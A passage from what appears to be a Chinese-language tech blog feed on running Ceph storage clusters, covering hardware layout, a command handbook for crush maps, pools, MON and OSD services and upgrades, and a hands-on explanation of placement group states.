<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">| Hostname  | IP Address    | Role  |                                           Hardware Info |</div><div class="line">|-----------+---------------+-------|---------------------------------------------------------|</div><div class="line">| ceph-adm  | 192.168.2.100 | adm   |                             2 Cores, 4GB RAM, 20GB DISK |</div><div class="line">| ceph-mon1 | 192.168.2.101 | mon   |                         24 Cores，64GB RAM, 2x750GB SAS |</div><div class="line">| ceph-mon2 | 192.168.2.102 | mon   |                         24 Cores，64GB RAM, 2x750GB SAS |</div><div class="line">| ceph-mon3 | 192.168.2.103 | mon   |                         24 Cores，64GB RAM, 2x750GB SAS |</div><div class="line">| ceph-osd1 | 192.168.2.121 | osd   | 12 Cores，64GB RAM, 10x4TB SAS，2x400GB SSD，2x80GB SSD |</div><div class="line">| ceph-osd2 | 192.168.2.122 | osd   | 12 Cores，64GB RAM, 10x4TB SAS，2x400GB SSD，2x80GB SSD |</div></pre></td></tr></table></figure>
</li>
<li><p>ADM 服务器硬件配置比较随意，用1台低配置的虚拟机就可以了，只是用来操作和管理 Ceph；</p>
</li>
<li>MON 服务器2块硬盘做成 RAID1，用来安装操作系统；</li>
<li>OSD 服务器上用10块 4TB 硬盘做 Ceph 存储，每个 osd 对应1块硬盘，每个 osd 需要1个 Journal，所以10块硬盘需要10个 Journal，我们用2块大容量 SSD 硬盘做 journal，每个 SSD 等分成5个区，这样每个区分别对应一个 osd 硬盘的 journal，剩下的2块小容量 SSD 装操作系统，采用 RAID1.</li>
</ul>
<p>ref<br><a href="http://docs.ceph.org.cn/start/hardware-recommendations/#id9" target="_blank" rel="external">硬件推荐</a><br><a href="https://github.com/lemonhall/node_note/blob/master/ceph%E7%9A%84%E7%A1%AC%E4%BB%B6%E9%85%8D%E7%BD%AE.txt" target="_blank" rel="external">ceph的硬件配置.txt</a><br><a href="http://www.vpsee.com/2015/07/install-ceph-on-centos-7/" target="_blank" rel="external">在 CentOS 7.1 上安装分布式存储系统 Ceph</a><br><a href="http://www.xuxiaopang.com/2016/10/10/ceph-full-install-el7-jewel/" target="_blank" rel="external">CEPH部署完整版(el7+jewel)</a><br><a href="http://www.xuxiaopang.com/2016/11/11/doc-ceph-table/" target="_blank" rel="external">Ceph常用表格汇总</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;cpu和内存&quot;&gt;&lt;a href=&quot;#cpu和内存&quot; class=&quot;headerlink&quot; title=&quot;cpu和内存&quot;&gt;&lt;/a&gt;&lt;b&gt;cpu和内存&lt;/b&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;CPU&lt;br&gt;metadata servers：属于CPU敏感型的角色服务器&lt;br
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ceph维护命令手册</title>
    <link href="https://t1ger.github.io/2017/06/01/ceph%E7%BB%B4%E6%8A%A4%E5%91%BD%E4%BB%A4%E6%89%8B%E5%86%8C/"/>
    <id>https://t1ger.github.io/2017/06/01/ceph维护命令手册/</id>
    <published>2017-06-01T09:09:48.000Z</published>
    <updated>2017-06-06T09:37:46.837Z</updated>
    
    <content type="html"><![CDATA[<p>本文操作都是centos7环境</p>
<h5 id="crush-map-管理方法"><a href="#crush-map-管理方法" class="headerlink" title="crush map 管理方法"></a><b>crush map 管理方法</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#获得默认 crushmap (加密)</div><div class="line">ceph osd getcrushmap -o crushmap.dump</div><div class="line"></div><div class="line">#转换 crushmap 格式 (加密 -&gt; 明文格式)</div><div class="line">crushtool -d crushmap.dump -o crushmap.txt</div><div class="line"></div><div class="line">#转换 crushmap 格式(明文 -&gt; 加密格式)</div><div class="line">crushtool -c crushmap.txt -o crushmap.done</div><div class="line"></div><div class="line">#重新使用新 crushmap</div><div class="line">ceph osd setcrushmap -i crushmap.done</div></pre></td></tr></table></figure>
<p>这里要说下,对crush map进行定义:<br>1 物理主机划分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">root default &#123;</div><div class="line">    id -1           # do not change unnecessarily</div><div class="line">    # weight 264.000</div><div class="line">    alg straw</div><div class="line">    hash 0  # rjenkins1</div><div class="line">    item 240.30.128.33 weight 12.000</div><div class="line">    item 240.30.128.32 weight 12.000</div><div class="line">    item 240.30.128.215 weight 12.000</div><div class="line">    item 240.30.128.209 weight 12.000</div><div class="line">    item 240.30.128.213 weight 12.000</div><div class="line">    item 240.30.128.214 weight 12.000</div><div class="line">    item 240.30.128.212 weight 12.000</div><div class="line">    item 240.30.128.211 weight 12.000</div><div class="line">    item 240.30.128.210 weight 12.000</div><div class="line">    item 240.30.128.208 weight 12.000</div><div class="line">    item 240.30.128.207 weight 12.000</div><div class="line">    item 240.30.128.63 weight 12.000</div><div class="line">    item 240.30.128.34 weight 12.000</div><div class="line">    item 240.30.128.35 weight 12.000</div><div class="line">    item 240.30.128.36 weight 12.000</div><div class="line">    item 240.30.128.37 weight 12.000</div><div class="line">    item 240.30.128.39 weight 12.000</div><div class="line">    item 240.30.128.38 weight 12.000</div><div class="line">    item 240.30.128.58 weight 12.000</div><div class="line">    item 240.30.128.59 weight 12.000</div><div class="line">    item 240.30.128.60 weight 12.000</div><div class="line">    item 240.30.128.29 weight 12.000</div><div class="line">&#125;</div><div class="line"></div><div class="line">root registry &#123;</div><div class="line">    id -26</div><div class="line">    # weight 36.000</div><div class="line">    alg straw</div><div class="line">    item 240.30.128.206 weight 12.000</div><div class="line">    item 240.30.128.40 weight 12.000</div><div class="line">    item 240.30.128.30 weight 12.000</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>说明:上面划分了两个物理区域</p>
<ul>
<li>root 区域, 包含了 264TB 空间</li>
<li>registry 区域,  包含了 36TB 空间<br>需要注意的问题:<br>建议在存放数据前就对物理池进行规划, 否则会出现大量数据迁移现象, 或者会出现 osd full 现象</li>
</ul>
<p>2.规则划分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">rule replicated_ruleset &#123;</div><div class="line">    ruleset 0</div><div class="line">    type replicated</div><div class="line">    min_size 1</div><div class="line">    max_size 10</div><div class="line">    step take default</div><div class="line">    step chooseleaf firstn 0 type host</div><div class="line">    step emit</div><div class="line">&#125;</div><div class="line"></div><div class="line">rule registry_ruleset &#123;</div><div class="line">    ruleset 1</div><div class="line">    type replicated</div><div class="line">    min_size 2</div><div class="line">    max_size 3</div><div class="line">    step take registry</div><div class="line">    step chooseleaf firstn 0 type host</div><div class="line">    step emit</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h5 id="pool-创建-删除方法"><a href="#pool-创建-删除方法" class="headerlink" title="pool 创建, 删除方法"></a><b>pool 创建, 删除方法</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#创建</div><div class="line"> ceph osd  pool  create  volumes 10240 10240</div><div class="line"> ceph osd  pool  create  paas 2048 2048</div><div class="line">#删除</div><div class="line"> ceph osd pool delete paas paas --yes-i-really-really-mean-it</div><div class="line">#查询</div><div class="line">[root@node1 ~]# ceph osd dump | grep replica</div><div class="line">#指定</div><div class="line"> ceph osd pool set paas crush_ruleset 1</div></pre></td></tr></table></figure>
<h5 id="MON操作"><a href="#MON操作" class="headerlink" title="MON操作"></a><b>MON操作</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">systemctl start ceph-mon@mon-host</div><div class="line">systemctl stop ceph-mon@mon-host</div><div class="line">systemctl restart ceph-mon@mon-host</div><div class="line">systemctl status ceph-mon@mon-host</div></pre></td></tr></table></figure>
<h5 id="OSD操作"><a href="#OSD操作" class="headerlink" title="OSD操作"></a><b>OSD操作</b></h5><p>把@*替换为OSD的ID 如@1，即可执行对应ID OSD的操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">systemctl start ceph-osd@*</div><div class="line">systemctl stop  ceph-osd@*</div><div class="line">systemctl restart ceph-osd@*</div><div class="line">systemctl status  ceph-osd@*</div></pre></td></tr></table></figure></p>
<h5 id="OSD机器重启"><a href="#OSD机器重启" class="headerlink" title="OSD机器重启"></a><b>OSD机器重启</b></h5><p>1.设置noout 避免在异常情况下触发集群数据重新平衡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ceph osd set noout</div></pre></td></tr></table></figure></p>
<p>2.关闭OSD机器上所有OSD进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ceph osd down x    #把这个机器上的OSD都设置为down状态</div><div class="line">systemctl stop ceph-osd@* #用systemctl重启OSD进程</div></pre></td></tr></table></figure></p>
<p>3.重启OSD机器<br>4.恢复noout 设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ceph osd unset noout</div></pre></td></tr></table></figure></p>
<h5 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a><b>扩容</b></h5><ul>
<li>PB级的集群的容量超过50%，就要考虑扩容了。 假如OSD主机的磁盘容量为48TB（12 4TB），则需要backfill的数据为24TB（48TB 50%） ，假设网卡为10Gb，则新加一个OSD时，集群大约需要19200s（24TB/(10Gb/8)） 约3小时完成backfill，而backfill后台数据填充将会涉及大量的IO读和网络传输，必将影响生产业务运行。 如果集群容量到80%再扩容会导致更长的backfill时间，近8个小时。</li>
<li>OSD对应的磁盘利用率如果超过50%，也需要尽快扩容。<br>在业务闲时,向集群中增加OSD主机。</li>
</ul>
<h5 id="升级Ceph软件版本"><a href="#升级Ceph软件版本" class="headerlink" title="升级Ceph软件版本"></a><b>升级Ceph软件版本</b></h5><p>1.在MON和OSD机器上升级安装指定的ceph版本的软件包<br>2.逐个重启MON进程<br>3.设置noout 避免在异常情况下触发集群数据重新平衡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ceph osd set noout</div></pre></td></tr></table></figure></p>
<p>4.逐个重启OSD进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ceph osd down x        #提前mark down， 减少slow request</div><div class="line">systemctl restart ceph-osd@x #用systemctl重启OSD进程</div></pre></td></tr></table></figure></p>
<p>5.恢复noout 设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ceph osd unset noout</div></pre></td></tr></table></figure></p>
<p>ref<br><a href="https://forest.gitbooks.io/ceph-practice/content/operation.html" target="_blank" rel="external">维护操作</a><br><a href="https://forest.gitbooks.io/ceph-practice/content/troubleshoot.html" target="_blank" rel="external">故障定位和处理</a><br><a href="https://yq.aliyun.com/articles/70814" target="_blank" rel="external">ceph - crush map 与 pool</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文操作都是centos7环境&lt;/p&gt;
&lt;h5 id=&quot;crush-map-管理方法&quot;&gt;&lt;a href=&quot;#crush-map-管理方法&quot; class=&quot;headerlink&quot; title=&quot;crush map 管理方法&quot;&gt;&lt;/a&gt;&lt;b&gt;crush map 管理方法&lt;/b&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Ceph-Placement Group States</title>
    <link href="https://t1ger.github.io/2017/05/31/Ceph-Placement-Group-States/"/>
    <id>https://t1ger.github.io/2017/05/31/Ceph-Placement-Group-States/</id>
    <published>2017-05-31T11:02:33.000Z</published>
    <updated>2017-06-01T08:08:23.953Z</updated>
    
    <content type="html"><![CDATA[<h5 id="PG状态简介"><a href="#PG状态简介" class="headerlink" title="PG状态简介"></a><b>PG状态简介</b></h5><p>PG，Placement Group,让我们简单了解几个PG的状态,可以分为:</p>
<ul>
<li>Creating: Ceph is still creating the placement group.</li>
<li>Scrubbing: Ceph is checking the placement group for inconsistencies.</li>
<li>Degraded: Ceph has not replicated some objects in the placement group the correct number of times yet.</li>
<li>Inconsistent: Ceph detects inconsistencies in the one or more replicas of an object in the placement group (e.g. objects are the wrong size, objects are missing from one replica after recovery finished, etc.).</li>
<li>Peering: The placement group is undergoing the peering process</li>
<li>Repair: Ceph is checking the placement group and repairing any inconsistencies it finds (if possible).</li>
<li>Recovering: Ceph is migrating/synchronizing objects and their replicas.</li>
<li>Backfill: Ceph is scanning and synchronizing the entire contents of a placement group instead of inferring what contents need to be synchronized from the logs of recent operations. Backfill is a special case of recovery.</li>
<li>Wait-backfill: The placement group is waiting in line to start backfill</li>
<li>Backfill-toofull: A backfill operation is waiting because the destination OSD is over its full ratio.</li>
<li>Incomplete: Ceph detects that a placement group is missing information about writes that may have occurred, or does not have any healthy copies. If you see this state, try to start any failed OSDs that may contain the needed information. In the case of an erasure coded pool temporarily reducing min_size may allow recovery</li>
<li>Remapped: The placement group is temporarily mapped to a different set of OSDs from what CRUSH specified.</li>
<li>Undersized: The placement group fewer copies than the configured pool replication level.</li>
<li>Peered: The placement group has peered, but cannot serve client IO due to not having enough copies to reach the pool’s configured min_size parameter. Recovery may occur in this state, so the pg may heal up to min_size eventually.<br>具体参考<a href="http://docs.ceph.com/docs/master/rados/operations/pg-states/" target="_blank" rel="external">这里</a></li>
</ul>
<h5 id="如何理解-PG"><a href="#如何理解-PG" class="headerlink" title="如何理解 PG"></a><b>如何理解 PG</b></h5><p>让我们来看下先前搭建的集群状态<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[root@admin ~]# ceph osd tree</div><div class="line">ID WEIGHT   TYPE NAME      UP/DOWN REWEIGHT PRIMARY-AFFINITY </div><div class="line">-1 17.94685 root default                                     </div><div class="line">-2  5.98228     host node1                                   </div><div class="line"> 0  1.99409         osd.0       up  1.00000          1.00000 </div><div class="line"> 1  1.99409         osd.1       up  1.00000          1.00000 </div><div class="line"> 2  1.99409         osd.2       up  1.00000          1.00000 </div><div class="line">-3  5.98228     host node2                                   </div><div class="line"> 3  1.99409         osd.3       up  1.00000          1.00000 </div><div class="line"> 4  1.99409         osd.4       up  1.00000          1.00000 </div><div class="line"> 5  1.99409         osd.5       up  1.00000          1.00000 </div><div class="line">-4  5.98228     host node3                                   </div><div class="line"> 6  1.99409         osd.6       up  1.00000          1.00000 </div><div class="line"> 7  1.99409         osd.7       up  1.00000          1.00000 </div><div class="line"> 8  1.99409         osd.8       up  1.00000          1.00000 </div><div class="line">[root@admin ~]#</div></pre></td></tr></table></figure></p>
<p>每一个pool都有一个id，系统默认生成的rbd池的id号为0，那么rbd池内的所有PG都会以0.开头，让我们看一下osd.0下面的current目录的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[root@node1 ~]# ls /var/lib/ceph/osd/ceph-0/current/</div><div class="line">0.0_head   0.16_TEMP  0.1c_head  0.23_TEMP  0.2b_head  0.38_TEMP  0.46_head  0.4d_TEMP  0.50_head  0.55_TEMP  0.64_head  0.6e_TEMP  0.72_head  0.79_TEMP  0.8_head</div><div class="line">0.0_TEMP   0.17_head  0.1c_TEMP  0.24_head  0.2b_TEMP  0.42_head  0.46_TEMP  0.4e_head  0.50_TEMP  0.59_head  0.64_TEMP  0.6_head   0.72_TEMP  0.7b_head  0.8_TEMP</div><div class="line">0.10_head  0.17_TEMP  0.1d_head  0.24_TEMP  0.2c_head  0.42_TEMP  0.48_head  0.4e_TEMP  0.53_head  0.59_TEMP  0.65_head  0.6_TEMP   0.75_head  0.7b_TEMP  commit_op_seq</div><div class="line">0.10_TEMP  0.18_head  0.1d_TEMP  0.25_head  0.2c_TEMP  0.43_head  0.48_TEMP  0.4f_head  0.53_TEMP  0.5c_head  0.65_TEMP  0.70_head  0.75_TEMP  0.7d_head  meta</div><div class="line">0.13_head  0.18_TEMP  0.20_head  0.25_TEMP  0.2_head   0.43_TEMP  0.49_head  0.4f_TEMP  0.54_head  0.5c_TEMP  0.6d_head  0.70_TEMP  0.77_head  0.7d_TEMP  nosnap</div><div class="line">0.13_TEMP  0.19_head  0.20_TEMP  0.2a_head  0.2_TEMP   0.44_head  0.49_TEMP  0.4_head   0.54_TEMP  0.63_head  0.6d_TEMP  0.71_head  0.77_TEMP  0.7e_head  omap</div><div class="line">0.16_head  0.19_TEMP  0.23_head  0.2a_TEMP  0.38_head  0.44_TEMP  0.4d_head  0.4_TEMP   0.55_head  0.63_TEMP  0.6e_head  0.71_TEMP  0.79_head  0.7e_TEMP</div></pre></td></tr></table></figure></p>
<p>每个OSD的current目录下都保存了部分的PG，而rbd池的PG以0.xxx_head的目录形式存在！</p>
<p>现在我们通过rados向集群写入一个文件(char.txt)，在集群内保存名为char,通过下面的指令查看该文件实际保存的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[root@admin ~]# ceph osd map rbd char</div><div class="line">osdmap e89 pool &apos;rbd&apos; (0) object &apos;char&apos; -&gt; pg 0.98165844 (0.44) -&gt; up ([0,3,8], p0) acting ([0,3,8], p0)</div></pre></td></tr></table></figure></p>
<p>可见，文件会保存在PG 0.44中，而这个PG位于osd.0,osd.3,osd.8中，之所以有这里有三个OSD，是因为集群副本数为3，可以在0/3/8这三个OSD的current下找到0.44_head目录。而同一份文件(比如这里的char.txt)的三个副本会分别保存在这三个同名的PG中</p>
<p>执行指令，将char.txt文件存入集群，并查看各个OSD的PG目录内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[root@admin ~]# rados -p rbd put char char.txt </div><div class="line"></div><div class="line">[root@node1 ~]# ll /var/lib/ceph/osd/ceph-0/current/0.44_head/</div><div class="line">total 4</div><div class="line">-rw-r--r-- 1 ceph ceph 4 May 31 18:20 char__head_98165844__0</div><div class="line">-rw-r--r-- 1 ceph ceph 0 May 31 10:41 __head_00000044__0</div><div class="line"></div><div class="line">[root@node2 ~]# ll /var/lib/ceph/osd/ceph-3/current/0.44_head/</div><div class="line">total 4</div><div class="line">-rw-r--r-- 1 ceph ceph 4 May 31 18:20 char__head_98165844__0</div><div class="line">-rw-r--r-- 1 ceph ceph 0 May 31 10:41 __head_00000044__0</div><div class="line"></div><div class="line">[root@node3 ~]# ll /var/lib/ceph/osd/ceph-8/current/0.44_head/</div><div class="line">total 4</div><div class="line">-rw-r--r-- 1 ceph ceph 4 May 31 18:20 char__head_98165844__0</div><div class="line">-rw-r--r-- 1 ceph ceph 0 May 31 10:41 __head_00000044__0</div></pre></td></tr></table></figure></p>
<p>可见，这三个OSD保存了这个文件的三分副本，这就是ceph的多副本的基础，将一份数据保存成多个副本，按照一定规则分布在各个OSD中，而多副本的数据的一个特点就是，他们都保存在同名的PG下面，也就是同名的目录下。这样，我们就对PG有了一个直接的理解</p>
<h5 id="PG-troubleshooting"><a href="#PG-troubleshooting" class="headerlink" title="PG troubleshooting"></a><b>PG troubleshooting</b></h5><ul>
<li><p>Degraded<br>降级：由上文可以得知，每个PG有三个副本，分别保存在不同的OSD中，在非故障情况下，这个PG是a+c状态，那么，如果保存0.44这个PG的osd.3挂掉了，这个PG是什么状态呢，操作如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[neo@node2 ~]$ sudo systemctl stop  ceph-osd@3</div><div class="line">[neo@node2 ~]$ sudo ceph pg dump_stuck |egrep ^0.44</div><div class="line">ok</div><div class="line">0.44    active+undersized+degraded      [0,8]   0       [0,8]   0</div></pre></td></tr></table></figure>
<p>  这里我们前往node2节点，手动停止了osd.3，然后查看此时pg 0.44的状态，可见，它此刻的状态是active+undersized+degraded,当一个PG所在的OSD挂掉之后，这个PG就会进入undersized+degraded状态，而后面的[0,8]的意义就是还有两个0.44的副本存活在osd.0和osd.8上。那么现在可以读取刚刚写入的那个文件吗？是可以正常读取的！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@admin test]# rados  -p rbd get char char.txt</div><div class="line">[root@admin test]# cat char.txt </div><div class="line">123</div></pre></td></tr></table></figure>
<p>  降级就是在发生了一些故障比如OSD挂掉之后，ceph将这个OSD上的所有PG标记为degraded，但是此时的集群还是可以正常读写数据的<br>而另一个词undersized,我的理解就是当前存活的PG 0.44数为2，小于副本数3，将其做此标记，也不是严重的问题</p>
</li>
<li>Remapped<br>ceph强大的自我恢复能力,在OSD挂掉5min(default 300s)之后，这个OSD会被标记为out状态，可以理解为ceph认为这个OSD已经不属于集群了，然后就会把PG 0.44 map到别的OSD上去，这个map也是按照一定的规则的，重映射之后呢，就会在另外两个OSD上找到0.44这个PG，而这只是创建了这个目录而已，丢失的数据是要从仅存的OSD上回填到新的OSD上的，处于回填状态的PG就会被标记为backfilling<br>所以当一个PG处于remapped+backfilling状态时，可以认为其处于自我克隆复制的自愈过程</li>
<li><p>Recover<br>这里我们先来做一个测试,首先开启所有OSD使得集群处于健康状态，然后前往osd.3的PG 0.44下面删除char<strong>head_98165844</strong>0这个文件，再通知ceph扫描(scrub)这个PG：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@node2 0.44_head]# pwd &amp;&amp; rm -f char__head_98165844__0</div><div class="line">/var/lib/ceph/osd/ceph-3/current/0.44_head</div><div class="line">[root@node2 0.44_head]# ceph pg scrub 0.44</div><div class="line">instructing pg 0.44 on osd.0 to scrub</div><div class="line">[root@node2 0.44_head]# ceph pg dump |egrep ^0.44 </div><div class="line">dumped all in format plain</div><div class="line">0.44    1       0       0       0       0       4       1       1       active+clean+inconsistent       2017-06-01 11:54:54.980396      89&apos;1    137:181 [0,3,8] 0       [0,3,8] 0       89&apos;1 2017-06-01 11:54:54.980279       0&apos;0     2017-05-27 11:44:16.205723</div></pre></td></tr></table></figure>
<p>  可见，0.44多了个inconsistent状态，顾名思义，ceph发现了这个PG的不一致状态，这样就可以理解这个状态的意义了。<br>想要修复丢失的文件呢，只需要执行ceph pg repair 0.44，ceph就会从别的副本中将丢失的文件拷贝过来，这也是ceph自愈的一个情形。<br>现在再假设一个情形，在osd.4挂掉的过程中呢，我们对char文件进行了写操作，因为集群内还存在着两个副本，是可以正常写入的，但是osd.3内的数据并没有得到更新，过了一会，osd.3上线了，ceph就发现，osd.3的char文件是陈旧的，就通过别的OSD向osd.3进行数据的恢复，使其数据为最新的，而这个恢复的过程中，PG就会被标记为recover</p>
</li>
</ul>
<p>ref<br><a href="http://www.xuxiaopang.com/2016/10/09/easy-ceph-PG/" target="_blank" rel="external">大话Ceph–PG那点事儿</a><br><a href="http://docs.ceph.com/docs/master/rados/operations/pg-states/" target="_blank" rel="external">PLACEMENT GROUP STATES</a><br><a href="https://www.gitbook.com/book/forest/ceph-practice/details" target="_blank" rel="external">Ceph 实战</a><br><a href="http://www.wzxue.com/ceph-osd-and-pg/" target="_blank" rel="external">解析 Ceph : OSD , OSDMap 和 PG, PGMap</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;PG状态简介&quot;&gt;&lt;a href=&quot;#PG状态简介&quot; class=&quot;headerlink&quot; title=&quot;PG状态简介&quot;&gt;&lt;/a&gt;&lt;b&gt;PG状态简介&lt;/b&gt;&lt;/h5&gt;&lt;p&gt;PG，Placement Group,让我们简单了解几个PG的状态,可以分为:&lt;/p&gt;
&lt;ul
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>INSTALL CEPH (QUICK)</title>
    <link href="https://t1ger.github.io/2017/05/26/INSTALL-CEPH-QUICK/"/>
    <id>https://t1ger.github.io/2017/05/26/INSTALL-CEPH-QUICK/</id>
    <published>2017-05-26T08:25:56.000Z</published>
    <updated>2017-06-02T03:25:35.583Z</updated>
    
    <content type="html"><![CDATA[<h5 id="概念介绍"><a href="#概念介绍" class="headerlink" title="概念介绍"></a><b>概念介绍</b></h5><p>Ceph的部署模式下主要包含以下几个类型的节点:</p>
<ul>
<li>Ceph OSD: 主要用来存储数据，处理数据的replication,恢复，填充，调整资源组合以及通过检查其他OSD进程的心跳信息提供一些监控信息给Ceph Monitors . 当Ceph Storage Cluster 要准备2份数据备份时，要求至少有2个Ceph OSD进程的状态是active+clean状态</li>
<li>Monitor: 维护集群map的状态，主要包括monitor map, OSD map, Placement Group (PG) map, 以及CRUSH map. Ceph 维护了 Ceph Monitors, Ceph OSD Daemons, 以及PGs状态变化的历史记录 (called an “epoch”)</li>
<li>MDS: Ceph Metadata Server (MDS)存储的元数据代表Ceph的文件系统 (i.e., Ceph Block Devices 以及Ceph Object Storage 不适用 MDS). Ceph Metadata Servers 让系统用户可以执行一些POSIX文件系统的基本命令，例如ls,find 等</li>
<li>PG全称Placement Grouops，是一个逻辑的概念，一个PG包含多个OSD。引入PG这一层其实是为了更好的分配数据和定位数据</li>
<li>RBD全称RADOS block device，是Ceph对外提供的块设备服务</li>
<li>RGW全称RADOS gateway，是Ceph对外提供的对象存储服务，接口与S3和Swift兼容</li>
<li>RADOS全称Reliable Autonomic Distributed Object Store，是Ceph集群的精华，用户实现数据分配、Failover等集群操作</li>
<li>Librados是Rados提供库，因为RADOS是协议很难直接访问，因此上层的RBD、RGW和CephFS都是通过librados访问的，目前提供PHP、Ruby、Java、Python、C和C++支持</li>
<li>CephFS全称Ceph File System，是Ceph对外提供的文件系统服务</li>
<li>CRUSH是Ceph使用的数据分布算法，类似一致性哈希，让数据分配到预期的地方</li>
</ul>
<h5 id="部署方案"><a href="#部署方案" class="headerlink" title="部署方案"></a><b>部署方案</b></h5><p>通过ceph-deploy可以快速便捷的安装上ceph,此方法部署需要一个管理节点（admin node)和3个节点来做ceph的存储集群<br>三台装有CentOS 7的主机，每台主机有三个磁盘(虚拟机磁盘要大于100G),详细信息如</p>
